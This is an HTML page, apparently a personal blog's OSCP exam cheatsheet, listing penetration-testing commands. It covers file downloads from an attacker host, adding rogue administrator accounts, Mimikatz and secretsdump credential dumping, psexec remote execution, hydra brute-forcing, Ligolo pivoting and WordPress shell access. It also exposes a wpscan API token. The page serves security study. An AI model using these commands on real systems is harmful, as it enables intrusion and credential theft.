@@ -1,0 +1,846 @@
+<!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> OSCP Cheatsheet | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="/assets/img/logos/m1N147z1.png?c5fa12f00bf81b0bfdfb738a6722b18c"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/docs/hacking/cheetsheets/OSCP/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">\ h0m3 / </a> </li> <li class="nav-item active"> <a class="nav-link" href="/docs/">/ d0Cs \ <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">\ bl0g / </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">/ m0Re \ </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/about/">about</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/repos/">repositories</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/cv/">Cv</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/news/">news</a> <div class="dropdown-divider"></div> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"><h1 id="general">General</h1> <aside> 💡 For Finding all important files in Windows (CTF Style) `cd c:\Users` then `tree /F` </aside> <p><strong>Discovering KDBX files</strong></p> <ol> <li>In Windows</li> </ol> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ChildItem <span class="nt">-Path</span> C:<span class="se">\ </span><span class="nt">-Include</span> <span class="k">*</span>.kdbx <span class="nt">-File</span> <span class="nt">-Recurse</span> <span class="nt">-ErrorAction</span> SilentlyContinue
+</code></pre></div></div> <ol> <li>In Linux</li> </ol> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-name</span> <span class="k">*</span>.kdbx 2&gt;/dev/null
+</code></pre></div></div> <p><br/></p> <h3 id="github-recon">GitHub recon</h3> <ul> <li>You need to find traces of the <code class="language-plaintext highlighter-rouge">.git</code> files on the target machine.</li> <li>Now navigate to the directory where the file is located, a potential repository.</li> <li>Commands</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Log information of the current repository.</span>
+git log
+
+<span class="c"># This will display the log of the stuff happened, like commit history which is very useful</span>
+git show &lt;commit-id&gt;
+
+<span class="c"># This shows the commit information and the newly added stuff.</span>
+</code></pre></div></div> <ul> <li>If you identify <code class="language-plaintext highlighter-rouge">.git</code> active on the website. Use https://github.com/arthaud/git-dumper now it downloads all the files and saves it locally. Perform the same above commands and escalate.</li> <li>Some useful GitHub dorks: <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets">https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets</a> → this might not be relevant to the exam environment.</li> </ul> <h2 id="connecting-to-rdp">Connecting to RDP</h2> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xfreerdp /u:uname /p:<span class="s1">'pass'</span> /v:IP
+xfreerdp /d:domain.com /u:uname /p:<span class="s1">'pass'</span> /v:IP
+xfreerdp /u:uname /p:<span class="s1">'pass'</span> /v:IP +clipboard <span class="c">#try this option if normal login doesn't work</span>
+</code></pre></div></div> <h2 id="adding-ssh-public-key">Adding SSH Public key</h2> <ul> <li>This can be used to get ssh session, on target machine which is based on linux</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 4096 <span class="c">#give any password</span>
+
+<span class="c">#This created both id_rsa and id_rsa.pub in ~/.ssh directory</span>
+<span class="c">#Copy the content in "id_rsa.pub" and create ".ssh" directory in /home of target machine.</span>
+<span class="nb">chmod </span>700 ~/.ssh
+nano ~/.ssh/authorized_keys <span class="c">#enter the copied content here</span>
+<span class="nb">chmod </span>600 ~/.ssh/authorized_keys
+
+<span class="c">#On Attacker machine</span>
+ssh username@target_ip <span class="c">#enter password if you gave any</span>
+</code></pre></div></div> <h2 id="file-transfers">File Transfers</h2> <ul> <li>Netcat</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Attacker</span>
+nc &lt;target_ip&gt; 1234 &lt; nmap
+
+<span class="c">#Target</span>
+nc <span class="nt">-lvp</span> 1234 <span class="o">&gt;</span> nmap
+</code></pre></div></div> <ul> <li>Downloading on Windows</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell <span class="nt">-command</span> Invoke-WebRequest <span class="nt">-Uri</span> http://&lt;LHOST&gt;:&lt;LPORT&gt;/&lt;FILE&gt; <span class="nt">-Outfile</span> C:<span class="se">\\</span>temp<span class="se">\\</span>&lt;FILE&gt;
+iwr <span class="nt">-uri</span> http://lhost/file <span class="nt">-Outfile</span> file
+certutil <span class="nt">-urlcache</span> <span class="nt">-split</span> <span class="nt">-f</span> <span class="s2">"http://&lt;LHOST&gt;/&lt;FILE&gt;"</span> &lt;FILE&gt;
+copy <span class="se">\\</span>kali<span class="se">\s</span>hare<span class="se">\f</span>ile <span class="nb">.</span>
+</code></pre></div></div> <ul> <li>Downloading on Linux</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://lhost/file
+curl http://&lt;LHOST&gt;/&lt;FILE&gt; <span class="o">&gt;</span> &lt;OUTPUT_FILE&gt;
+</code></pre></div></div> <p><br/></p> <h3 id="windows-to-kali">Windows to Kali</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali&gt; impacket-smbserver -smb2support &lt;sharename&gt; .
+win&gt; copy file \\KaliIP\sharename
+</code></pre></div></div> <h2 id="adding-users">Adding Users</h2> <p><br/></p> <h3 id="windows">Windows</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user hacker hacker123 /add
+net localgroup Administrators hacker /add
+net localgroup <span class="s2">"Remote Desktop Users"</span> hacker /ADD
+</code></pre></div></div> <p><br/></p> <h3 id="linux">Linux</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adduser &lt;<span class="nb">uname</span><span class="o">&gt;</span> <span class="c">#Interactive</span>
+useradd &lt;<span class="nb">uname</span><span class="o">&gt;</span>
+
+useradd <span class="nt">-u</span> &lt;UID&gt; <span class="nt">-g</span> &lt;group&gt; &lt;<span class="nb">uname</span><span class="o">&gt;</span>  <span class="c">#UID can be something new than existing, this command is to add a user to a specific group</span>
+</code></pre></div></div> <h2 id="password-hash-cracking">Password-Hash Cracking</h2> <p><em>Hash Analyzer</em>: <a href="https://www.tunnelsup.com/hash-analyzer/">https://www.tunnelsup.com/hash-analyzer/</a></p> <p><br/></p> <h3 id="fcrackzip">fcrackzip</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fcrackzip <span class="nt">-u</span> <span class="nt">-D</span> <span class="nt">-p</span> /usr/share/wordlists/rockyou.txt &lt;FILE&gt;.zip <span class="c">#Cracking zip files</span>
+</code></pre></div></div> <p><br/></p> <h3 id="john">John</h3> <blockquote> <p><a href="https://github.com/openwall/john/tree/bleeding-jumbo/run">https://github.com/openwall/john/tree/bleeding-jumbo/run</a></p> </blockquote> <ul> <li>If there’s an encrypted file, convert it into john hash and crack.</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh2john.py id_rsa <span class="o">&gt;</span> <span class="nb">hash</span>
+<span class="c">#Convert the obtained hash to John format(above link)</span>
+john hashfile <span class="nt">--wordlist</span><span class="o">=</span>rockyou.txt
+</code></pre></div></div> <p><br/></p> <h3 id="hashcat">Hashcat</h3> <blockquote> <p><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p> </blockquote> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Obtain the Hash module number</span>
+hashcat <span class="nt">-m</span> &lt;number&gt; <span class="nb">hash </span>wordlists.txt <span class="nt">--force</span>
+</code></pre></div></div> <h2 id="pivoting-through-ssh">Pivoting through SSH</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh adminuser@10.10.155.5 <span class="nt">-i</span> id_rsa <span class="nt">-D</span> 9050 <span class="c">#TOR port</span>
+
+<span class="c">#Change the info in /etc/proxychains4.conf also enable "Quiet Mode"</span>
+
+proxychains4 crackmapexec smb 10.10.10.0/24 <span class="c">#Example</span>
+</code></pre></div></div> <h2 id="dealing-with-passwords">Dealing with Passwords</h2> <ul> <li>When there’s a scope for bruteforce or hash-cracking then try the following, <ul> <li>Have a valid username first</li> <li>Don’t forget trying <code class="language-plaintext highlighter-rouge">admin:admin</code></li> <li>Try <code class="language-plaintext highlighter-rouge">username:username</code> as first credential</li> <li>If it’s related to a service, try default passwords.</li> <li>The service name is the username, and the same name is used for the password.</li> <li>Use Rockyou.txt</li> </ul> </li> <li>Some default passwords to always try out!</li> </ul> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>password
+password1
+Password1
+Password@123
+password@123
+admin
+administrator
+admin@123
+</code></pre></div></div> <h2 id="impacket">Impacket</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient.py <span class="o">[</span>domain]/[user]:[password/password <span class="nb">hash</span><span class="o">]</span>@[Target IP Address] <span class="c">#we connect to the server rather than a share</span>
+
+lookupsid.py <span class="o">[</span>domain]/[user]:[password/password <span class="nb">hash</span><span class="o">]</span>@[Target IP Address] <span class="c">#User enumeration on target</span>
+
+services.py <span class="o">[</span>domain]/[user]:[Password/Password Hash]@[Target IP Address] <span class="o">[</span>Action] <span class="c">#service enumeration</span>
+
+secretsdump.py <span class="o">[</span>domain]/[user]:[password/password <span class="nb">hash</span><span class="o">]</span>@[Target IP Address]  <span class="c">#Dumping hashes on target</span>
+
+GetUserSPNs.py <span class="o">[</span>domain]/[user]:[password/password <span class="nb">hash</span><span class="o">]</span>@[Target IP Address] <span class="nt">-dc-ip</span> &lt;IP&gt; <span class="nt">-request</span>  <span class="c">#Kerberoasting, and request option dumps TGS</span>
+
+GetNPUsers.py test.local/ <span class="nt">-dc-ip</span> &lt;IP&gt; <span class="nt">-usersfile</span> usernames.txt <span class="nt">-format</span> hashcat <span class="nt">-outputfile</span> hashes.txt <span class="c">#Asreproasting, need to provide usernames list</span>
+
+<span class="c">##RCE</span>
+psexec.py test.local/john:password123@10.10.10.1
+psexec.py <span class="nt">-hashes</span> lmhash:nthash test.local/john@10.10.10.1
+
+wmiexec.py test.local/john:password123@10.10.10.1
+wmiexec.py <span class="nt">-hashes</span> lmhash:nthash test.local/john@10.10.10.1
+
+smbexec.py test.local/john:password123@10.10.10.1
+smbexec.py <span class="nt">-hashes</span> lmhash:nthash test.local/john@10.10.10.1
+
+atexec.py test.local/john:password123@10.10.10.1 &lt;<span class="nb">command</span><span class="o">&gt;</span>
+atexec.py <span class="nt">-hashes</span> lmhash:nthash test.local/john@10.10.10.1 &lt;<span class="nb">command</span><span class="o">&gt;</span>
+
+</code></pre></div></div> <h2 id="evil-winrm">Evil-Winrm</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">##winrm service discovery</span>
+nmap <span class="nt">-p5985</span>,5986 &lt;IP&gt;
+5985 - plaintext protocol
+5986 - encrypted
+
+<span class="c">##Login with password</span>
+evil-winrm <span class="nt">-i</span> &lt;IP&gt; <span class="nt">-u</span> user <span class="nt">-p</span> pass
+evil-winrm <span class="nt">-i</span> &lt;IP&gt; <span class="nt">-u</span> user <span class="nt">-p</span> pass <span class="nt">-S</span> <span class="c">#if 5986 port is open</span>
+
+<span class="c">##Login with Hash</span>
+evil-winrm <span class="nt">-i</span> &lt;IP&gt; <span class="nt">-u</span> user <span class="nt">-H</span> ntlmhash
+
+<span class="c">##Login with key</span>
+evil-winrm <span class="nt">-i</span> &lt;IP&gt; <span class="nt">-c</span> certificate.pem <span class="nt">-k</span> priv-key.pem <span class="nt">-S</span> <span class="c">#-c for public key and -k for private key</span>
+
+<span class="c">##Logs</span>
+evil-winrm <span class="nt">-i</span> &lt;IP&gt; <span class="nt">-u</span> user <span class="nt">-p</span> pass <span class="nt">-l</span>
+
+<span class="c">##File upload and download</span>
+upload &lt;file&gt;
+download &lt;file&gt; &lt;filepath-kali&gt; <span class="c">#not required to provide path all time</span>
+
+<span class="c">##Loading files direclty from Kali location</span>
+evil-winrm <span class="nt">-i</span> &lt;IP&gt; <span class="nt">-u</span> user <span class="nt">-p</span> pass <span class="nt">-s</span> /opt/privsc/powershell <span class="c">#Location can be different</span>
+Bypass-4MSI
+Invoke-Mimikatz.ps1
+Invoke-Mimikatz
+
+<span class="c">##evil-winrm commands</span>
+menu <span class="c"># to view commands</span>
+<span class="c">#There are several commands to run</span>
+<span class="c">#This is an example for running a binary</span>
+evil-winrm <span class="nt">-i</span> &lt;IP&gt; <span class="nt">-u</span> user <span class="nt">-p</span> pass <span class="nt">-e</span> /opt/privsc
+Bypass-4MSI
+menu
+Invoke-Binary /opt/privsc/winPEASx64.exe
+</code></pre></div></div> <h2 id="mimikatz">Mimikatz</h2> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>privilege::debug
+
+token::elevate
+
+sekurlsa::logonpasswords <span class="c">#hashes and plaintext passwords</span>
+lsadump::sam
+lsadump::sam SystemBkup.hiv SamBkup.hiv
+lsadump::dcsync /user:krbtgt
+lsadump::lsa /patch <span class="c">#both these dump SAM</span>
+
+<span class="c">#OneLiner</span>
+.<span class="se">\m</span>imikatz.exe <span class="s2">"privilege::debug"</span> <span class="s2">"sekurlsa::logonpasswords"</span> <span class="s2">"exit"</span>
+
+</code></pre></div></div> <h2 id="ligolo-ng">Ligolo-ng</h2> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Creating interface and starting it.</span>
+<span class="nb">sudo </span>ip tuntap add user <span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span> mode tun ligolo
+<span class="nb">sudo </span>ip <span class="nb">link set </span>ligolo up
+
+<span class="c">#Kali machine - Attacker machine</span>
+./proxy <span class="nt">-laddr</span> 0.0.0.0:9001 <span class="nt">-selfcert</span>
+
+<span class="c">#windows or linux machine - compromised machine</span>
+agent.exe <span class="nt">-connect</span> &lt;LHOST&gt;:9001 <span class="nt">-ignore-cert</span>
+
+<span class="c">#In Ligolo-ng console</span>
+session <span class="c">#select host</span>
+ifconfig <span class="c">#Notedown the internal network's subnet</span>
+start <span class="c">#after adding relevent subnet to ligolo interface</span>
+
+<span class="c">#Adding subnet to ligolo interface - Kali linux</span>
+<span class="nb">sudo </span>ip r add &lt;subnet&gt; dev ligolo
+
+</code></pre></div></div> <hr/> <h1 id="recon-and-enumeration">Recon and Enumeration</h1> <ul> <li>OSINT OR Passive Recon <aside> 💡 Not that useful for OSCP as we’ll be dealing with internal machines </aside> <ul> <li>whois: <code class="language-plaintext highlighter-rouge">whois &lt;domain&gt;</code> or <code class="language-plaintext highlighter-rouge">whois &lt;domain&gt; -h &lt;IP&gt;</code></li> <li>Google Dorking, <ul> <li>site</li> <li>filetype</li> <li>intitle</li> <li>GHDB - Google hacking database</li> </ul> </li> <li>OS and Service Information using <a href="http://searchdns.netcraft.com">searchdns.netcraft.com</a></li> <li>Github Dorking <ul> <li>filename</li> <li>user</li> <li>A tool called Gitleaks for automated enumeration</li> </ul> </li> <li>Shodan dorks <ul> <li>hostname</li> <li>port</li> <li>Then gather information by going through the options</li> </ul> </li> <li>Scanning Security headers and SSL/TLS using <a href="https://securityheaders.com/">https://securityheaders.com/</a></li> </ul> </li> </ul> <h2 id="port-scanning">Port Scanning</h2> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#use -Pn option if you're getting nothing in the scan</span>
+nmap <span class="nt">-sC</span> <span class="nt">-sV</span> &lt;IP&gt; <span class="nt">-v</span> <span class="c">#Basic scan</span>
+nmap <span class="nt">-T4</span> <span class="nt">-A</span> <span class="nt">-p-</span> &lt;IP&gt; <span class="nt">-v</span> <span class="c">#complete scan</span>
+<span class="nb">sudo </span>nmap <span class="nt">-sV</span> <span class="nt">-p</span> 443 <span class="nt">--script</span> <span class="s2">"vuln"</span> 192.168.50.124 <span class="c">#running vuln category scripts</span>
+
+<span class="c">#NSE</span>
+updatedb
+locate .nse | <span class="nb">grep</span> &lt;name&gt;
+<span class="nb">sudo </span>nmap <span class="nt">--script</span><span class="o">=</span><span class="s2">"name"</span> &lt;IP&gt; <span class="c">#here we can specify other options like specific ports...etc</span>
+
+Test-NetConnection <span class="nt">-Port</span> &lt;port&gt; &lt;IP&gt;   <span class="c">#powershell utility</span>
+
+1..1024 | % <span class="o">{</span><span class="nb">echo</span> <span class="o">((</span>New-Object Net.Sockets.TcpClient<span class="o">)</span>.Connect<span class="o">(</span><span class="s2">"IP"</span>, <span class="nv">$_</span><span class="o">))</span> <span class="s2">"TCP port </span><span class="nv">$_</span><span class="s2"> is open"</span><span class="o">}</span> 2&gt;<span class="nv">$null</span> <span class="c">#automating port scan of first 1024 ports in powershell</span>
+</code></pre></div></div> <h2 id="ftp-enumeration">FTP enumeration</h2> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp &lt;IP&gt;
+<span class="c">#login if you have relevant creds or based on nmap scan find out whether this has an anonymous login or not, then login with Anonymous:password</span>
+
+put &lt;file&gt; <span class="c">#uploading file</span>
+get &lt;file&gt; <span class="c">#downloading file</span>
+
+<span class="c">#NSE</span>
+locate .nse | <span class="nb">grep </span>ftp
+nmap <span class="nt">-p21</span> <span class="nt">--script</span><span class="o">=</span>&lt;name&gt; &lt;IP&gt;
+
+<span class="c">#bruteforce</span>
+hydra <span class="nt">-L</span> users.txt <span class="nt">-P</span> passwords.txt &lt;IP&gt; ftp <span class="c">#'-L' for usernames list, '-l' for username and vice versa</span>
+
+<span class="c"># Check for vulnerabilities associated with the identified version.</span>
+</code></pre></div></div> <h2 id="ssh-enumeration">SSH enumeration</h2> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Login</span>
+ssh <span class="nb">uname</span>@IP <span class="c">#enter the password in the prompt</span>
+
+<span class="c">#id_rsa or id_ecdsa file</span>
+<span class="nb">chmod </span>600 id_rsa/id_ecdsa
+ssh <span class="nb">uname</span>@IP <span class="nt">-i</span> id_rsa/id_ecdsa <span class="c">#if it still asks for the password, crack it using John</span>
+
+<span class="c">#cracking id_rsa or id_ecdsa</span>
+ssh2john id_ecdsa<span class="o">(</span>or<span class="o">)</span>id_rsa <span class="o">&gt;</span> <span class="nb">hash
+</span>john <span class="nt">--wordlist</span><span class="o">=</span>/home/sathvik/Wordlists/rockyou.txt <span class="nb">hash</span>
+
+<span class="c">#bruteforce</span>
+hydra <span class="nt">-l</span> <span class="nb">uname</span> <span class="nt">-P</span> passwords.txt &lt;IP&gt; ssh <span class="c">#'-L' for usernames list, '-l' for username and vice versa</span>
+
+<span class="c"># Check for vulnerabilities associated with the identified version.</span>
+</code></pre></div></div> <h2 id="smb-enumeration">SMB enumeration</h2> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nbtscan <span class="nt">-r</span> 192.168.50.0/24 <span class="c">#IP or range can be provided</span>
+
+<span class="c">#NSE scripts can be used</span>
+locate .nse | <span class="nb">grep </span>smb
+nmap <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span><span class="s2">"name"</span> <span class="nv">$IP</span>
+
+<span class="c">#In windows we can view like this</span>
+net view <span class="se">\\</span>&lt;computername/IP&gt; /all
+
+<span class="c">#crackmapexec</span>
+crackmapexec smb &lt;IP/range&gt;
+crackmapexec smb 192.168.1.100 <span class="nt">-u</span> username <span class="nt">-p</span> password
+crackmapexec smb 192.168.1.100 <span class="nt">-u</span> username <span class="nt">-p</span> password <span class="nt">--shares</span> <span class="c">#lists available shares</span>
+crackmapexec smb 192.168.1.100 <span class="nt">-u</span> username <span class="nt">-p</span> password <span class="nt">--users</span> <span class="c">#lists users</span>
+crackmapexec smb 192.168.1.100 <span class="nt">-u</span> username <span class="nt">-p</span> password <span class="nt">--all</span> <span class="c">#all information</span>
+crackmapexec smb 192.168.1.100 <span class="nt">-u</span> username <span class="nt">-p</span> password <span class="nt">-p</span> 445 <span class="nt">--shares</span> <span class="c">#specific port</span>
+crackmapexec smb 192.168.1.100 <span class="nt">-u</span> username <span class="nt">-p</span> password <span class="nt">-d</span> mydomain <span class="nt">--shares</span> <span class="c">#specific domain</span>
+<span class="c">#Inplace of username and password, we can include usernames.txt and passwords.txt for password-spraying or bruteforcing.</span>
+
+<span class="c"># Smbclient</span>
+smbclient <span class="nt">-L</span> //IP <span class="c">#or try with 4 /'s</span>
+smbclient //server/share
+smbclient //server/share <span class="nt">-U</span> &lt;username&gt;
+smbclient //server/share <span class="nt">-U</span> domain/username
+
+<span class="c">#SMBmap</span>
+smbmap <span class="nt">-H</span> &lt;target_ip&gt;
+smbmap <span class="nt">-H</span> &lt;target_ip&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt;
+smbmap <span class="nt">-H</span> &lt;target_ip&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">-d</span> &lt;domain&gt;
+smbmap <span class="nt">-H</span> &lt;target_ip&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">-r</span> &lt;share_name&gt;
+
+<span class="c">#Within SMB session</span>
+put &lt;file&gt; <span class="c">#to upload file</span>
+get &lt;file&gt; <span class="c">#to download file</span>
+</code></pre></div></div> <ul> <li>Downloading shares is made easy—if the folder consists of several files, they will all be downloaded by this.</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mask <span class="s2">""</span>
+recurse ON
+prompt OFF
+mget <span class="k">*</span>
+</code></pre></div></div> <h2 id="https-enumeration">HTTP/S enumeration</h2> <ul> <li>View the source code and identify any hidden content. If an image looks suspicious, download it and try to find hidden data in it.</li> <li>Identify the version or CMS and check for active exploits. This can be done using Nmap and Wappalyzer.</li> <li>check /robots.txt folder</li> <li>Look for the hostname and add the relevant one to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</li> <li>Directory and file discovery - Obtain any hidden files that may contain juicy information</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dirbuster
+gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://example.com <span class="nt">-w</span> /path/to/wordlist.txt
+python3 dirsearch.py <span class="nt">-u</span> http://example.com <span class="nt">-w</span> /path/to/wordlist.txt
+</code></pre></div></div> <ul> <li>Vulnerability Scanning using nikto: <code class="language-plaintext highlighter-rouge">nikto -h &lt;url&gt;</code></li> <li><code class="language-plaintext highlighter-rouge">HTTPS</code>SSL certificate inspection, may reveal information like subdomains, usernames…etc</li> <li>Default credentials: Identify the CMS or service, check for default credentials, and test them out.</li> <li>Bruteforce</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-L</span> users.txt <span class="nt">-P</span> password.txt &lt;IP or domain&gt; http-<span class="o">{</span>post/get<span class="o">}</span><span class="nt">-form</span> <span class="s2">"/path:name=^USER^&amp;password=^PASS^&amp;enter=Sign+in:Login name or password is incorrect"</span> <span class="nt">-V</span>
+<span class="c"># Use https-post-form mode for https, post, or get, which can be obtained from Burpsuite. Also, capture the response for detailed information.</span>
+
+<span class="c">#Bruteforce can also be done by Burpsuite but it's slow, prefer Hydra!</span>
+</code></pre></div></div> <ul> <li>if <code class="language-plaintext highlighter-rouge">cgi-bin</code> is present, then do further fuzzing and obtain files like .sh or .pl</li> <li>Check if other services like FTP/SMB or any other that has upload privileges are getting reflected on the web.</li> <li>API - Fuzz further, and it can reveal some sensitive information</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#identifying endpoints using gobuster</span>
+gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.50.16:5002 <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-p</span> pattern <span class="c">#pattern can be like {GOBUSTER}/v1 here v1 is just for example, it can be anything</span>
+
+<span class="c">#obtaining info using curl</span>
+curl <span class="nt">-i</span> http://192.168.50.16:5002/users/v1
+</code></pre></div></div> <ul> <li>If there is any Input field check for <strong>Remote Code execution</strong> or <strong>SQL Injection</strong></li> <li>Check the URL, whether we can leverage <strong>Local or Remote File Inclusion</strong>.</li> <li>Also check if there’s any file upload utility(also obtain the location it’s getting reflected)</li> </ul> <p><br/></p> <h3 id="wordpress">Wordpress</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># basic usage</span>
+wpscan <span class="nt">--url</span> <span class="s2">"target"</span> <span class="nt">--verbose</span>
+
+<span class="c"># enumerate vulnerable plugins, users, vulnerable themes, timthumbs</span>
+wpscan <span class="nt">--url</span> <span class="s2">"target"</span> <span class="nt">--enumerate</span> vp,u,vt,tt <span class="nt">--follow-redirection</span> <span class="nt">--verbose</span> <span class="nt">--log</span> target.log
+
+<span class="c"># Add Wpscan API to get the details of vulnerabilties.</span>
+wpscan <span class="nt">--url</span> http://alvida-eatery.org/ <span class="nt">--api-token</span> NjnoSGZkuWDve0fDjmmnUNb1ZnkRw6J2J1FvBsVLPkA
+
+<span class="c">#Accessing Wordpress shell</span>
+http://10.10.67.245/retro/wp-admin/theme-editor.php?file<span class="o">=</span>404.php&amp;theme<span class="o">=</span>90s-retro
+
+http://10.10.67.245/retro/wp-content/themes/90s-retro/404.php
+</code></pre></div></div> <p><br/></p> <h3 id="drupal">Drupal</h3> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>droopescan scan drupal <span class="nt">-u</span> http://site
+</code></pre></div></div> <p><br/></p> <h3 id="joomla">Joomla</h3> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>droopescan scan joomla <span class="nt">--url</span> http://site
+<span class="nb">sudo </span>python3 joomla-brute.py <span class="nt">-u</span> http://site/ <span class="nt">-w</span> passwords.txt <span class="nt">-usr</span> username <span class="c">#https://github.com/ajnik/joomla-bruteforce</span>
+</code></pre></div></div> <h2 id="dns-enumeration">DNS enumeration</h2> <ul> <li>Better use <code class="language-plaintext highlighter-rouge">Seclists</code> wordlists for better enumeration. <a href="https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS">https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS</a></li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>host www.megacorpone.com
+host <span class="nt">-t</span> mx megacorpone.com
+host <span class="nt">-t</span> txt megacorpone.com
+
+<span class="k">for </span>ip <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>list.txt<span class="si">)</span><span class="p">;</span> <span class="k">do </span>host <span class="nv">$ip</span>.megacorpone.com<span class="p">;</span> <span class="k">done</span> <span class="c">#DNS Bruteforce</span>
